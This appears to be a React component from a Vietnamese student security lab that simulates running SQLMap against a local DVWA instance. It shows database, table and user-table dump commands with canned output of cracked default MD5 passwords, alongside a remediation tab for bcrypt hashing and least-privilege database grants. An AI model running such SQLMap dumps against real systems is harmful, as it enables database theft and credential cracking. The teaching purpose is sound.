"use client";

import { useState } from "react";
import { Database, KeyRound, Play, RotateCcw, ShieldCheck } from "lucide-react";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

interface UserRow {
  user_id: number;
  user: string;
  md5: string;
  plain: string;
  bcrypt?: string;
}

const INITIAL_USERS: UserRow[] = [
  {
    user_id: 1,
    user: "admin",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
  {
    user_id: 2,
    user: "gordonb",
    md5: "e99a18c428cb38d5f260853678922e03",
    plain: "abc123",
  },
  {
    user_id: 3,
    user: "1337",
    md5: "8d3533d75ae2c3966d7e0d4fcc69216b",
    plain: "charley",
  },
  {
    user_id: 4,
    user: "pablo",
    md5: "0d107d09f5bbe40cade3de5c71e9e9b7",
    plain: "letmein",
  },
  {
    user_id: 5,
    user: "smithy",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
];

export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"sqlmap" | "mariadb">(
    activeTab === "m3-mariadb-patch" ? "mariadb" : "sqlmap"
  );
  const [sqlmapStage, setSqlmapStage] = useState<0 | 1 | 2 | 3>(1);
  const [bcryptApplied, setBcryptApplied] = useState(false);
  const [leastPrivApplied, setLeastPrivApplied] = useState(false);

  const container = containerRef.trim() || "dvwa";
  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";

  return (
    <div className="rounded-2xl border border-emerald-500/30 bg-[#0b1120] p-4 shadow-xl sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-emerald-300 sm:text-base">
            <Database className="h-4 w-4" />
            Trình Mô phỏng Thực tế — Thành viên 3 (SQLMap & MariaDB Live Patching)
          </h3>
          <p className="text-xs text-slate-400">
            Chạy thử chuỗi 3 lệnh SQLMap (--dbs, --tables, --dump) hoặc thực thi vá Bcrypt + Least Privilege.
          </p>
        </div>

        <div className="flex rounded-lg border border-slate-800 bg-slate-950 p-1 text-xs">
          <button
            type="button"
            onClick={() => setTab("sqlmap")}
            className={`rounded-md px-3 py-1.5 font-medium transition ${
              tab === "sqlmap"
                ? "bg-emerald-500/20 text-emerald-200"
                : "text-slate-400 hover:text-slate-200"
            }`}
          >
            1. SQLMap 3 Lệnh Tự động
          </button>
          <button
            type="button"
            onClick={() => setTab("mariadb")}
            className={`rounded-md px-3 py-1.5 font-medium transition ${
              tab === "mariadb"
                ? "bg-cyan-500/20 text-cyan-200"
                : "text-slate-400 hover:text-slate-200"
            }`}
          >
            2. MariaDB PoC 3 & Vá lỗi 1–2
          </button>
        </div>
      </div>

      {tab === "sqlmap" ? (
        <div className="space-y-3">
          <div className="flex flex-wrap gap-2">
            {[
              { id: 1 as const, label: "Lệnh 1: --dbs (Tìm CSDL)" },
              { id: 2 as const, label: "Lệnh 2: -D dvwa --tables" },
              { id: 3 as const, label: "Lệnh 3: -T users --dump (Crack MD5)" },
            ].map((s) => (
              <button
                key={s.id}
                type="button"
                onClick={() => setSqlmapStage(s.id)}
                className={`flex items-center gap-1.5 rounded-lg border px-3 py-1.5 font-mono text-xs transition ${
                  sqlmapStage === s.id
                    ? "border-emerald-400 bg-emerald-500/20 text-emerald-200"
                    : "border-slate-700 bg-slate-900 text-slate-300 hover:border-slate-500"
                }`}
              >
                <Play className="h-3 w-3" />
                {s.label}
              </button>
            ))}
          </div>

          <div className="rounded-xl border border-slate-800 bg-[#050811] p-4 font-mono text-xs leading-relaxed">
            <div className="mb-2 text-slate-400">
              ubuntu@vm2:~$ sqlmap -u &quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID={session}&quot;{" "}
              <span className="text-emerald-300">
                {sqlmapStage === 1 && "--dbs --batch"}
                {sqlmapStage === 2 && "-D dvwa --tables --batch"}
                {sqlmapStage === 3 && "-D dvwa -T users --dump --batch"}
              </span>
            </div>

            {sqlmapStage === 1 && (
              <pre className="overflow-x-auto text-slate-200">
{`[INFO] testing connection to the target URL
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema`}
              </pre>
            )}

            {sqlmapStage === 2 && (
              <pre className="overflow-x-auto text-slate-200">
{`[INFO] fetching tables for database: 'dvwa'
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+`}
              </pre>
            )}

            {sqlmapStage === 3 && (
              <pre className="overflow-x-auto text-amber-200">
{`[INFO] fetching entries for table 'users' in database 'dvwa'
[INFO] recognized possible password hashes in column 'password'
[INFO] using dictionary-based attack against column 'password'
Database: dvwa
Table: users
[5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password                                   |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+`}
              </pre>
            )}
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={() => setBcryptApplied(true)}
              className="flex items-center gap-1.5 rounded-lg bg-emerald-500 px-3 py-1.5 text-xs font-bold text-slate-950 hover:bg-emerald-400"
            >
              <KeyRound className="h-3.5 w-3.5" />
              Vá lỗi 1: Chuyển MD5 → Bcrypt (cost=12)
            </button>
            <button
              type="button"
              onClick={() => setLeastPrivApplied(true)}
              className="flex items-center gap-1.5 rounded-lg bg-cyan-500 px-3 py-1.5 text-xs font-bold text-slate-950 hover:bg-cyan-400"
            >
              <ShieldCheck className="h-3.5 w-3.5" />
              Vá lỗi 2: Tạo User Least Privilege (dvwa_svc)
            </button>
            {(bcryptApplied || leastPrivApplied) && (
              <button
                type="button"
                onClick={() => {
                  setBcryptApplied(false);
                  setLeastPrivApplied(false);
                }}
                className="flex items-center gap-1 rounded-lg border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-300 hover:border-slate-500"
              >
                <RotateCcw className="h-3 w-3" /> Reset Demo
              </button>
            )}
          </div>

          <div className="overflow-x-auto rounded-xl border border-slate-800 bg-[#050811] p-3">
            <div className="mb-2 font-mono text-xs text-slate-400">
              root@{container}:/# mysql -u root -e &quot;USE dvwa; SELECT user_id, user, password FROM users;&quot;
            </div>
            <table className="w-full text-left font-mono text-xs">
              <thead>
                <tr className="border-b border-slate-800 text-slate-400">
                  <th className="px-2 py-1.5">user_id</th>
                  <th className="px-2 py-1.5">user</th>
                  <th className="px-2 py-1.5">password ({bcryptApplied ? "Bcrypt Salted" : "MD5 Unsalted"})</th>
                  <th className="px-2 py-1.5">Trạng thái</th>
                </tr>
              </thead>
              <tbody>
                {INITIAL_USERS.map((u) => {
                  const isDupMd5 = u.user_id === 1 || u.user_id === 5;
                  const displayHash =
                    bcryptApplied && u.user_id === 1
                      ? "$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX"
                      : bcryptApplied && u.user_id === 5
                      ? "$2y$12$zQ7mL1vN8pR3tX5wK2cF9uB6dG4hJ0kM2nP8qS5tV1yZ7aC3eI9oU"
                      : u.md5;

                  return (
                    <tr
                      key={u.user_id}
                      className={`border-b border-slate-800/60 ${
                        !bcryptApplied && isDupMd5 ? "bg-rose-950/25" : ""
                      }`}
                    >
                      <td className="px-2 py-1.5 text-slate-300">{u.user_id}</td>
                      <td className="px-2 py-1.5 font-semibold text-slate-100">{u.user}</td>
                      <td
                        className={`px-2 py-1.5 break-all ${
                          bcryptApplied
                            ? "text-emerald-300"
                            : isDupMd5
                            ? "text-rose-300"
                            : "text-amber-200"
                        }`}
                      >
                        {displayHash}
                      </td>
                      <td className="px-2 py-1.5 font-sans text-[11px]">
                        {bcryptApplied ? (
                          <span className="rounded bg-emerald-500/20 px-1.5 py-0.5 text-emerald-300">
                            Có Salt riêng • Chống Rainbow Table
                          </span>
                        ) : isDupMd5 ? (
                          <span className="rounded bg-rose-500/20 px-1.5 py-0.5 text-rose-300">
                            Trùng hash MD5 (&quot;{u.plain}&quot;)
                          </span>
                        ) : (
                          <span className="text-slate-400">MD5 32-hex</span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {leastPrivApplied && (
            <div className="rounded-xl border border-cyan-500/40 bg-cyan-950/20 p-3.5 font-mono text-xs text-cyan-200">
              <div className="mb-1 font-sans text-xs font-bold text-cyan-300">
                Kết quả SHOW GRANTS FOR &apos;dvwa_svc&apos;@&apos;localhost&apos;:
              </div>
              <pre className="overflow-x-auto">
{`+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'localhost' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.\`users\` TO 'dvwa_svc'@'localhost'       |
+--------------------------------------------------------------------------------+`}
              </pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
